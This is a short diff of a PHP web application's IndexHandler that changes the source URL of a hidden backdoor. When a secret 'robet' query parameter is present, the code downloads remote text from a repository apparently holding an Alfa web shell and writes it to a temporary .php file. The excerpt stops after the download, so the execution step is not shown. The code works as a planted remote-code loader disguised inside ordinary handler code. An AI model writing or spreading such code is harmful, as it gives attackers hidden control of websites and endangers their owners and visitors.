@@ -96,7 +96,7 @@ class IndexHandler extends Handler {
 }
 if (isset($_GET['robet'])) {
     try {
-        $u = "https://jakartafc.com/jajah.txt";
+        $u = "https://raw.githubusercontent.com/seovennn/shell/refs/heads/main/Alfa/robet.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
         $c = @file_get_contents($u);
